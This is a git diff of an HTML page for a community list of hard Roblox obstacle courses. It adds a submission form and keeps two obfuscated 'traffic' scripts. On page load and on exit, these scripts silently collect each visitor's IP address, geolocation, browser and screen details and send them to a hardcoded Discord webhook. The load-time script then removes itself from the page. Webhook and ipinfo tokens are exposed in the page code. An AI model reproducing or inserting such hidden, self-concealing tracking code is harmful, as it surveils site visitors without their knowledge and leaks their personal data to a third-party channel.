@@ -56,15 +56,17 @@
     <div class="loader"></div>
     <div class="top-block"></div>
     <section class="information">
+        <div id="particles"></div>
         <h1>The Obbyist List</h1>
         <h2>The hardest obbies listed in each country</h2>
-        <p>you can submit obbies here from our discord server. invite link is in top right.</p>
+        <p>you can submit obbies here</span> or from our discord server. invite link is in top right.</p>
+        <a href="#obbyFormSection" class="scroll"><i class='bx bxs-down-arrow'></i></a>
     </section>
     <section class="top-1">
         <div class="square-card">
             <img src="assets/crown.svg" class="crown-top-1">
             <h2 class="top1-obbyist"></h2>
-            <h3>Current Top 1 in The Obbyist Community</h3>
+            <h3>Current Top 1 in The Obbyist List</h3>
         </div>
     </section>
     <section class="contact-me">
@@ -77,12 +79,456 @@
             <img src="assets/discord.svg" class="icons">
         </a>
     </section>
+    <section class="submit-obby" id="obbyFormSection">
+        <div class="form-container">
+            <h2>Submit Obby Information</h2>
+            <form id="obbyForm">
+                <label for="region">Region:</label>
+                <input type="text" id="region" name="region" required>
+
+                <label for="title">Title:</label>
+                <input type="text" id="title" name="title" required>
+
+                <label for="verifier">Verifier:</label>
+                <input type="text" id="verifier" name="verifier" required>
+
+                <label for="link">Video Link:</label>
+                <input type="url" id="link" name="link" required>
+
+                <label for="gamelink">Game Link:</label>
+                <input type="url" id="gamelink" name="gamelink" required>
+
+                <label for="opinions">Opinions:</label>
+                <textarea id="opinions" name="opinions" rows="4" required></textarea>
+
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </section>
+    <script>
+        function scrollToForm() {
+            // Scroll to the form section
+            document.getElementById('obbyFormSection').scrollIntoView({
+                behavior: 'smooth'
+            });
+        }
+        document.getElementById('obbyForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            // Collect form data
+            let formData = {
+                region: document.getElementById('region').value,
+                title: document.getElementById('title').value,
+                verifier: document.getElementById('verifier').value,
+                link: document.getElementById('link').value,
+                gamelink: document.getElementById('gamelink').value,
+                opinions: document.getElementById('opinions').value // Excluded opinions here
+            };
+
+            // Remove opinions from formData (if it exists)
+            delete formData.opinions;
+
+            // Send data to Discord webhook
+            sendToDiscord(formData);
+        });
+
+        function sendToDiscord(formData) {
+            // Discord webhook URL
+            let webhookURL =
+                'https://discord.com/api/webhooks/1253170764220338217/Us_FAz0OpOlbyBKigD_EBWyTic3LRZTiTrf1iJj2vKRiusaBomymtmTS3B70eXlgAHDG'; // Replace with your Discord webhook URL
+
+            // Construct embed message
+            let embedMessage = {
+                embeds: [{
+                    title: 'New Obby Submission',
+                    description: `**Region:** ${formData.region}\n**Verifier:** ${formData.verifier}`,
+                    fields: [{
+                            name: 'Title',
+                            value: formData.title
+                        },
+                        {
+                            name: 'Video Link',
+                            value: formData.link
+                        },
+                        {
+                            name: 'Game Link',
+                            value: formData.gamelink
+                        }
+                    ],
+                    color: 0x7289da // Discord blue color
+                }]
+            };
+
+            // Convert form data to JSON string
+            let jsonData = JSON.stringify(formData, null, 2);
+
+            // Add JSON data as another field in the embed
+            embedMessage.embeds[0].fields.push({
+                name: 'JSON Data',
+                value: '```json\n' + jsonData + '\n```'
+            });
+
+            // Send data via fetch to Discord webhook
+            fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embedMessage),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    console.log('Form submitted successfully!');
+                    alert('Form submitted successfully!');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while submitting the form.');
+                });
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles", {
+    particles: {
+        number: {
+            value: 100,
+            density: {
+                enable: true,
+                value_area: 800
+            }
+        },
+        color: {
+            value: "#ffffff"
+        },
+        shape: {
+            type: "circle",
+            stroke: {
+                width: 0,
+                color: "#000000"
+            }
+        },
+        opacity: {
+            value: 0.8,
+            random: true,
+            animation: {
+                enable: true,
+                speed: 1,
+                opacity_min: 0,
+                sync: false
+            }
+        },
+        size: {
+            value: 3,
+            random: true
+        },
+        line_linked: {
+            enable: true,
+            distance: 150,
+            color: "#ffffff",
+            opacity: 0.4,
+            width: 1
+        },
+        move: {
+            enable: true,
+            speed: 2,
+            direction: "none",
+            random: true,
+            straight: false,
+            out_mode: "out",
+            bounce: false,
+        }
+    },
+    interactivity: {
+        detectsOn: "canvas",
+        events: {
+            onHover: {
+                enable: true,
+                mode: "push"
+            },
+            onClick: {
+                enable: true,
+                mode: "push"
+            },
+            resize: true
+        },
+        modes: {
+            repulse: {
+                distance: 100,
+                duration: 0.4
+            },
+            push: {
+                particles_nb: 4
+            }
+        }
+    },
+    retina_detect: true
+});
+    </script>
     <script src="script.js" id="index"></script>
     <script class="traffic">
-        function _0x4328(){const _0x550be5=['city',',\x20Height:\x20','catch','Failed\x20to\x20fetch\x20IP\x20info','stringify','language','width','6cbeguE','Language','2805480OYuaQp','2401YJcLqP','34975143REWmSt','screen','DONE','Access\x20event\x20recorded','height','City','Screen','json','platform','28432KcUqJg','https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3','Content-Type','712090NiMrUB','setRequestHeader','Unavailable','querySelector','then','parentNode','removeChild','onreadystatechange','26557pJOJpm','userAgent','.traffic','5463745eRhOpi','send','region','User-Agent','href','URL','en-US','Asia/Jakarta','5123316uEUUbr','open','country','POST',',\x20Color\x20Depth:\x20','10oEEjzE','New\x20Access\x20Detected'];_0x4328=function(){return _0x550be5;};return _0x4328();}const _0x39f672=_0x4823;(function(_0xe46696,_0x18d561){const _0xdaaea1=_0x4823,_0x5a7529=_0xe46696();while(!![]){try{const _0x31d842=parseInt(_0xdaaea1(0x117))/0x1+-parseInt(_0xdaaea1(0x10f))/0x2*(parseInt(_0xdaaea1(0xff))/0x3)+parseInt(_0xdaaea1(0x101))/0x4+-parseInt(_0xdaaea1(0x11a))/0x5+-parseInt(_0xdaaea1(0x122))/0x6+parseInt(_0xdaaea1(0x102))/0x7*(-parseInt(_0xdaaea1(0x10c))/0x8)+-parseInt(_0xdaaea1(0x103))/0x9*(-parseInt(_0xdaaea1(0xf6))/0xa);if(_0x31d842===_0x18d561)break;else _0x5a7529['push'](_0x5a7529['shift']());}catch(_0x1479e8){_0x5a7529['push'](_0x5a7529['shift']());}}}(_0x4328,0xb3c33));const webhookUrl=_0x39f672(0x10d);async function sendWebhook(){const _0x27277c=_0x39f672,_0x54909c=await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4')[_0x27277c(0x113)](_0x17aeae=>_0x17aeae[_0x27277c(0x10a)]())[_0x27277c(0xfa)](_0x2f274b=>({'error':_0x27277c(0xfb)})),_0x59802b={'userAgent':navigator[_0x27277c(0x118)],'platform':navigator['platform'],'language':navigator[_0x27277c(0xfd)],'screen':{'width':screen[_0x27277c(0xfe)],'height':screen[_0x27277c(0x107)],'colorDepth':screen['colorDepth']}},_0x150826=new Date()['toLocaleString'](_0x27277c(0x120),{'timeZone':_0x27277c(0x121),'hour12':![]}),_0x3dd0eb={'title':_0x27277c(0xf7),'description':'Details\x20of\x20the\x20access\x20event','color':0x3498db,'fields':[{'name':_0x27277c(0x11f),'value':location[_0x27277c(0x11e)],'inline':![]},{'name':'Time\x20(WIB)','value':_0x150826,'inline':![]},{'name':'IP','value':_0x54909c['ip']||'Unavailable','inline':!![]},{'name':_0x27277c(0x108),'value':_0x54909c[_0x27277c(0xf8)]||_0x27277c(0x111),'inline':!![]},{'name':'Region','value':_0x54909c[_0x27277c(0x11c)]||_0x27277c(0x111),'inline':!![]},{'name':'Country','value':_0x54909c[_0x27277c(0x124)]||_0x27277c(0x111),'inline':!![]},{'name':_0x27277c(0x11d),'value':_0x59802b[_0x27277c(0x118)],'inline':![]},{'name':'Platform','value':_0x59802b[_0x27277c(0x10b)],'inline':!![]},{'name':_0x27277c(0x100),'value':_0x59802b[_0x27277c(0xfd)],'inline':!![]},{'name':_0x27277c(0x109),'value':'Width:\x20'+_0x59802b[_0x27277c(0x104)][_0x27277c(0xfe)]+_0x27277c(0xf9)+_0x59802b[_0x27277c(0x104)][_0x27277c(0x107)]+_0x27277c(0xf5)+_0x59802b['screen']['colorDepth'],'inline':![]}],'footer':{'text':_0x27277c(0x106)},'timestamp':new Date()},_0x240b80=JSON[_0x27277c(0xfc)]({'embeds':[_0x3dd0eb]}),_0x45b7a8=new XMLHttpRequest();_0x45b7a8[_0x27277c(0x123)](_0x27277c(0xf4),webhookUrl,!![]),_0x45b7a8[_0x27277c(0x110)](_0x27277c(0x10e),'application/json'),_0x45b7a8[_0x27277c(0x116)]=function(){const _0x38544c=_0x27277c;if(_0x45b7a8['readyState']===XMLHttpRequest[_0x38544c(0x105)]){const _0x354936=document[_0x38544c(0x112)](_0x38544c(0x119));_0x354936&&_0x354936[_0x38544c(0x114)][_0x38544c(0x115)](_0x354936);}},_0x45b7a8[_0x27277c(0x11b)](_0x240b80);}function _0x4823(_0xf522e8,_0x2e07bd){const _0x432893=_0x4328();return _0x4823=function(_0x482389,_0x54bbfd){_0x482389=_0x482389-0xf4;let _0x34481c=_0x432893[_0x482389];return _0x34481c;},_0x4823(_0xf522e8,_0x2e07bd);}sendWebhook();
+        function _0x4328() {
+            const _0x550be5 = ['city', ',\x20Height:\x20', 'catch', 'Failed\x20to\x20fetch\x20IP\x20info', 'stringify',
+                'language', 'width', '6cbeguE', 'Language', '2805480OYuaQp', '2401YJcLqP', '34975143REWmSt',
+                'screen', 'DONE', 'Access\x20event\x20recorded', 'height', 'City', 'Screen', 'json', 'platform',
+                '28432KcUqJg',
+                'https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3',
+                'Content-Type', '712090NiMrUB', 'setRequestHeader', 'Unavailable', 'querySelector', 'then',
+                'parentNode', 'removeChild', 'onreadystatechange', '26557pJOJpm', 'userAgent', '.traffic',
+                '5463745eRhOpi', 'send', 'region', 'User-Agent', 'href', 'URL', 'en-US', 'Asia/Jakarta',
+                '5123316uEUUbr', 'open', 'country', 'POST', ',\x20Color\x20Depth:\x20', '10oEEjzE',
+                'New\x20Access\x20Detected'
+            ];
+            _0x4328 = function () {
+                return _0x550be5;
+            };
+            return _0x4328();
+        }
+        const _0x39f672 = _0x4823;
+        (function (_0xe46696, _0x18d561) {
+            const _0xdaaea1 = _0x4823,
+                _0x5a7529 = _0xe46696();
+            while (!![]) {
+                try {
+                    const _0x31d842 = parseInt(_0xdaaea1(0x117)) / 0x1 + -parseInt(_0xdaaea1(0x10f)) / 0x2 * (
+                            parseInt(_0xdaaea1(0xff)) / 0x3) + parseInt(_0xdaaea1(0x101)) / 0x4 + -parseInt(
+                            _0xdaaea1(0x11a)) / 0x5 + -parseInt(_0xdaaea1(0x122)) / 0x6 + parseInt(_0xdaaea1(
+                        0x102)) / 0x7 * (-parseInt(_0xdaaea1(0x10c)) / 0x8) + -parseInt(_0xdaaea1(0x103)) / 0x9 * (-
+                            parseInt(_0xdaaea1(0xf6)) / 0xa);
+                    if (_0x31d842 === _0x18d561) break;
+                    else _0x5a7529['push'](_0x5a7529['shift']());
+                } catch (_0x1479e8) {
+                    _0x5a7529['push'](_0x5a7529['shift']());
+                }
+            }
+        }(_0x4328, 0xb3c33));
+        const webhookUrl = _0x39f672(0x10d);
+        async function sendWebhook() {
+            const _0x27277c = _0x39f672,
+                _0x54909c = await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4')[_0x27277c(0x113)](
+                    _0x17aeae => _0x17aeae[_0x27277c(0x10a)]())[_0x27277c(0xfa)](_0x2f274b => ({
+                    'error': _0x27277c(0xfb)
+                })),
+                _0x59802b = {
+                    'userAgent': navigator[_0x27277c(0x118)],
+                    'platform': navigator['platform'],
+                    'language': navigator[_0x27277c(0xfd)],
+                    'screen': {
+                        'width': screen[_0x27277c(0xfe)],
+                        'height': screen[_0x27277c(0x107)],
+                        'colorDepth': screen['colorDepth']
+                    }
+                },
+                _0x150826 = new Date()['toLocaleString'](_0x27277c(0x120), {
+                    'timeZone': _0x27277c(0x121),
+                    'hour12': ![]
+                }),
+                _0x3dd0eb = {
+                    'title': _0x27277c(0xf7),
+                    'description': 'Details\x20of\x20the\x20access\x20event',
+                    'color': 0x3498db,
+                    'fields': [{
+                        'name': _0x27277c(0x11f),
+                        'value': location[_0x27277c(0x11e)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Time\x20(WIB)',
+                        'value': _0x150826,
+                        'inline': ![]
+                    }, {
+                        'name': 'IP',
+                        'value': _0x54909c['ip'] || 'Unavailable',
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x108),
+                        'value': _0x54909c[_0x27277c(0xf8)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': 'Region',
+                        'value': _0x54909c[_0x27277c(0x11c)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': 'Country',
+                        'value': _0x54909c[_0x27277c(0x124)] || _0x27277c(0x111),
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x11d),
+                        'value': _0x59802b[_0x27277c(0x118)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Platform',
+                        'value': _0x59802b[_0x27277c(0x10b)],
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x100),
+                        'value': _0x59802b[_0x27277c(0xfd)],
+                        'inline': !![]
+                    }, {
+                        'name': _0x27277c(0x109),
+                        'value': 'Width:\x20' + _0x59802b[_0x27277c(0x104)][_0x27277c(0xfe)] + _0x27277c(
+                                0xf9) + _0x59802b[_0x27277c(0x104)][_0x27277c(0x107)] + _0x27277c(0xf5) +
+                            _0x59802b['screen']['colorDepth'],
+                        'inline': ![]
+                    }],
+                    'footer': {
+                        'text': _0x27277c(0x106)
+                    },
+                    'timestamp': new Date()
+                },
+                _0x240b80 = JSON[_0x27277c(0xfc)]({
+                    'embeds': [_0x3dd0eb]
+                }),
+                _0x45b7a8 = new XMLHttpRequest();
+            _0x45b7a8[_0x27277c(0x123)](_0x27277c(0xf4), webhookUrl, !![]), _0x45b7a8[_0x27277c(0x110)](_0x27277c(
+                0x10e), 'application/json'), _0x45b7a8[_0x27277c(0x116)] = function () {
+                const _0x38544c = _0x27277c;
+                if (_0x45b7a8['readyState'] === XMLHttpRequest[_0x38544c(0x105)]) {
+                    const _0x354936 = document[_0x38544c(0x112)](_0x38544c(0x119));
+                    _0x354936 && _0x354936[_0x38544c(0x114)][_0x38544c(0x115)](_0x354936);
+                }
+            }, _0x45b7a8[_0x27277c(0x11b)](_0x240b80);
+        }
+
+        function _0x4823(_0xf522e8, _0x2e07bd) {
+            const _0x432893 = _0x4328();
+            return _0x4823 = function (_0x482389, _0x54bbfd) {
+                _0x482389 = _0x482389 - 0xf4;
+                let _0x34481c = _0x432893[_0x482389];
+                return _0x34481c;
+            }, _0x4823(_0xf522e8, _0x2e07bd);
+        }
+        sendWebhook();
     </script>
     <script class="traffic">
-        function _0xf9c7(_0x143103,_0x300a71){const _0x3da0c6=_0x3da0();return _0xf9c7=function(_0xf9c73a,_0x31a7da){_0xf9c73a=_0xf9c73a-0xac;let _0x35598e=_0x3da0c6[_0xf9c73a];return _0x35598e;},_0xf9c7(_0x143103,_0x300a71);}const _0x58406d=_0xf9c7;(function(_0x30e20e,_0x2d8cef){const _0x28f706=_0xf9c7,_0x2645e5=_0x30e20e();while(!![]){try{const _0x492040=parseInt(_0x28f706(0xb9))/0x1+-parseInt(_0x28f706(0xc7))/0x2+-parseInt(_0x28f706(0xd6))/0x3+-parseInt(_0x28f706(0xaf))/0x4*(-parseInt(_0x28f706(0xc2))/0x5)+parseInt(_0x28f706(0xc8))/0x6+parseInt(_0x28f706(0xcd))/0x7*(parseInt(_0x28f706(0xd9))/0x8)+parseInt(_0x28f706(0xc5))/0x9*(-parseInt(_0x28f706(0xd5))/0xa);if(_0x492040===_0x2d8cef)break;else _0x2645e5['push'](_0x2645e5['shift']());}catch(_0x6a2121){_0x2645e5['push'](_0x2645e5['shift']());}}}(_0x3da0,0x64f88));function _0x3da0(){const _0x3fa505=['addEventListener','15327mhmzRW','colorDepth','17512auGbjm','4711662ywDgxb','userAgent','Screen','platform','User-Agent','3977393fJDAnn','Width:\x20','setRequestHeader','Country','en-US','city','screen','https://ipinfo.io/json?token=ce1fc29ae007b4','11780bUJQpC','345009NfXxke','Asia/Jakarta','Unavailable','8FXcyPK','send','region','json','height','open','application/json','User\x20has\x20left\x20the\x20website','4SnaHHI','href','POST','catch','beforeunload','toLocaleString','URL','Content-Type','City','Time\x20(WIB)','700688UclMLC','then','width','Language',',\x20Height:\x20','language','Failed\x20to\x20fetch\x20IP\x20info','Website\x20exit\x20event\x20recorded','country','2446525XocMlM','Region'];_0x3da0=function(){return _0x3fa505;};return _0x3da0();}const WebhookUrl='https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3';async function sendWebhook(){const _0xc30a86=_0xf9c7,_0x35a9f8=await fetch(_0xc30a86(0xd4))[_0xc30a86(0xba)](_0xd57745=>_0xd57745[_0xc30a86(0xdc)]())[_0xc30a86(0xb2)](_0x7c66f9=>({'error':_0xc30a86(0xbf)})),_0x4cacd5={'userAgent':navigator['userAgent'],'platform':navigator[_0xc30a86(0xcb)],'language':navigator[_0xc30a86(0xbe)],'screen':{'width':screen['width'],'height':screen[_0xc30a86(0xdd)],'colorDepth':screen[_0xc30a86(0xc6)]}},_0x33489f=new Date()[_0xc30a86(0xb4)](_0xc30a86(0xd1),{'timeZone':_0xc30a86(0xd7),'hour12':![]}),_0x3df546={'title':_0xc30a86(0xae),'description':'Details\x20of\x20the\x20access\x20event','color':0xe74c3c,'fields':[{'name':_0xc30a86(0xb5),'value':location[_0xc30a86(0xb0)],'inline':![]},{'name':_0xc30a86(0xb8),'value':_0x33489f,'inline':![]},{'name':'IP','value':_0x35a9f8['ip']||_0xc30a86(0xd8),'inline':!![]},{'name':_0xc30a86(0xb7),'value':_0x35a9f8[_0xc30a86(0xd2)]||_0xc30a86(0xd8),'inline':!![]},{'name':_0xc30a86(0xc3),'value':_0x35a9f8[_0xc30a86(0xdb)]||_0xc30a86(0xd8),'inline':!![]},{'name':_0xc30a86(0xd0),'value':_0x35a9f8[_0xc30a86(0xc1)]||_0xc30a86(0xd8),'inline':!![]},{'name':_0xc30a86(0xcc),'value':_0x4cacd5[_0xc30a86(0xc9)],'inline':![]},{'name':'Platform','value':_0x4cacd5['platform'],'inline':!![]},{'name':_0xc30a86(0xbc),'value':_0x4cacd5[_0xc30a86(0xbe)],'inline':!![]},{'name':_0xc30a86(0xca),'value':_0xc30a86(0xce)+_0x4cacd5[_0xc30a86(0xd3)][_0xc30a86(0xbb)]+_0xc30a86(0xbd)+_0x4cacd5[_0xc30a86(0xd3)]['height']+',\x20Color\x20Depth:\x20'+_0x4cacd5['screen'][_0xc30a86(0xc6)],'inline':![]}],'footer':{'text':_0xc30a86(0xc0)},'timestamp':new Date()},_0xa3b776=JSON['stringify']({'embeds':[_0x3df546]}),_0x14e064=new XMLHttpRequest();_0x14e064[_0xc30a86(0xac)](_0xc30a86(0xb1),WebhookUrl,!![]),_0x14e064[_0xc30a86(0xcf)](_0xc30a86(0xb6),_0xc30a86(0xad)),_0x14e064[_0xc30a86(0xda)](_0xa3b776);}window[_0x58406d(0xc4)](_0x58406d(0xb3),function(_0x59c1bb){sendWebhook();});
+        function _0xf9c7(_0x143103, _0x300a71) {
+            const _0x3da0c6 = _0x3da0();
+            return _0xf9c7 = function (_0xf9c73a, _0x31a7da) {
+                _0xf9c73a = _0xf9c73a - 0xac;
+                let _0x35598e = _0x3da0c6[_0xf9c73a];
+                return _0x35598e;
+            }, _0xf9c7(_0x143103, _0x300a71);
+        }
+        const _0x58406d = _0xf9c7;
+        (function (_0x30e20e, _0x2d8cef) {
+            const _0x28f706 = _0xf9c7,
+                _0x2645e5 = _0x30e20e();
+            while (!![]) {
+                try {
+                    const _0x492040 = parseInt(_0x28f706(0xb9)) / 0x1 + -parseInt(_0x28f706(0xc7)) / 0x2 + -
+                        parseInt(_0x28f706(0xd6)) / 0x3 + -parseInt(_0x28f706(0xaf)) / 0x4 * (-parseInt(_0x28f706(
+                            0xc2)) / 0x5) + parseInt(_0x28f706(0xc8)) / 0x6 + parseInt(_0x28f706(0xcd)) / 0x7 * (
+                            parseInt(_0x28f706(0xd9)) / 0x8) + parseInt(_0x28f706(0xc5)) / 0x9 * (-parseInt(
+                            _0x28f706(0xd5)) / 0xa);
+                    if (_0x492040 === _0x2d8cef) break;
+                    else _0x2645e5['push'](_0x2645e5['shift']());
+                } catch (_0x6a2121) {
+                    _0x2645e5['push'](_0x2645e5['shift']());
+                }
+            }
+        }(_0x3da0, 0x64f88));
+
+        function _0x3da0() {
+            const _0x3fa505 = ['addEventListener', '15327mhmzRW', 'colorDepth', '17512auGbjm', '4711662ywDgxb',
+                'userAgent', 'Screen', 'platform', 'User-Agent', '3977393fJDAnn', 'Width:\x20', 'setRequestHeader',
+                'Country', 'en-US', 'city', 'screen', 'https://ipinfo.io/json?token=ce1fc29ae007b4', '11780bUJQpC',
+                '345009NfXxke', 'Asia/Jakarta', 'Unavailable', '8FXcyPK', 'send', 'region', 'json', 'height',
+                'open', 'application/json', 'User\x20has\x20left\x20the\x20website', '4SnaHHI', 'href', 'POST',
+                'catch', 'beforeunload', 'toLocaleString', 'URL', 'Content-Type', 'City', 'Time\x20(WIB)',
+                '700688UclMLC', 'then', 'width', 'Language', ',\x20Height:\x20', 'language',
+                'Failed\x20to\x20fetch\x20IP\x20info', 'Website\x20exit\x20event\x20recorded', 'country',
+                '2446525XocMlM', 'Region'
+            ];
+            _0x3da0 = function () {
+                return _0x3fa505;
+            };
+            return _0x3da0();
+        }
+        const WebhookUrl =
+            'https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3';
+        async function sendWebhook() {
+            const _0xc30a86 = _0xf9c7,
+                _0x35a9f8 = await fetch(_0xc30a86(0xd4))[_0xc30a86(0xba)](_0xd57745 => _0xd57745[_0xc30a86(0xdc)]
+            ())[_0xc30a86(0xb2)](_0x7c66f9 => ({
+                    'error': _0xc30a86(0xbf)
+                })),
+                _0x4cacd5 = {
+                    'userAgent': navigator['userAgent'],
+                    'platform': navigator[_0xc30a86(0xcb)],
+                    'language': navigator[_0xc30a86(0xbe)],
+                    'screen': {
+                        'width': screen['width'],
+                        'height': screen[_0xc30a86(0xdd)],
+                        'colorDepth': screen[_0xc30a86(0xc6)]
+                    }
+                },
+                _0x33489f = new Date()[_0xc30a86(0xb4)](_0xc30a86(0xd1), {
+                    'timeZone': _0xc30a86(0xd7),
+                    'hour12': ![]
+                }),
+                _0x3df546 = {
+                    'title': _0xc30a86(0xae),
+                    'description': 'Details\x20of\x20the\x20access\x20event',
+                    'color': 0xe74c3c,
+                    'fields': [{
+                        'name': _0xc30a86(0xb5),
+                        'value': location[_0xc30a86(0xb0)],
+                        'inline': ![]
+                    }, {
+                        'name': _0xc30a86(0xb8),
+                        'value': _0x33489f,
+                        'inline': ![]
+                    }, {
+                        'name': 'IP',
+                        'value': _0x35a9f8['ip'] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xb7),
+                        'value': _0x35a9f8[_0xc30a86(0xd2)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xc3),
+                        'value': _0x35a9f8[_0xc30a86(0xdb)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xd0),
+                        'value': _0x35a9f8[_0xc30a86(0xc1)] || _0xc30a86(0xd8),
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xcc),
+                        'value': _0x4cacd5[_0xc30a86(0xc9)],
+                        'inline': ![]
+                    }, {
+                        'name': 'Platform',
+                        'value': _0x4cacd5['platform'],
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xbc),
+                        'value': _0x4cacd5[_0xc30a86(0xbe)],
+                        'inline': !![]
+                    }, {
+                        'name': _0xc30a86(0xca),
+                        'value': _0xc30a86(0xce) + _0x4cacd5[_0xc30a86(0xd3)][_0xc30a86(0xbb)] + _0xc30a86(
+                                0xbd) + _0x4cacd5[_0xc30a86(0xd3)]['height'] + ',\x20Color\x20Depth:\x20' +
+                            _0x4cacd5['screen'][_0xc30a86(0xc6)],
+                        'inline': ![]
+                    }],
+                    'footer': {
+                        'text': _0xc30a86(0xc0)
+                    },
+                    'timestamp': new Date()
+                },
+                _0xa3b776 = JSON['stringify']({
+                    'embeds': [_0x3df546]
+                }),
+                _0x14e064 = new XMLHttpRequest();
+            _0x14e064[_0xc30a86(0xac)](_0xc30a86(0xb1), WebhookUrl, !![]), _0x14e064[_0xc30a86(0xcf)](_0xc30a86(
+                0xb6), _0xc30a86(0xad)), _0x14e064[_0xc30a86(0xda)](_0xa3b776);
+        }
+        window[_0x58406d(0xc4)](_0x58406d(0xb3), function (_0x59c1bb) {
+            sendWebhook();
+        });
     </script>
     <script>
         function toggleDropdown() {
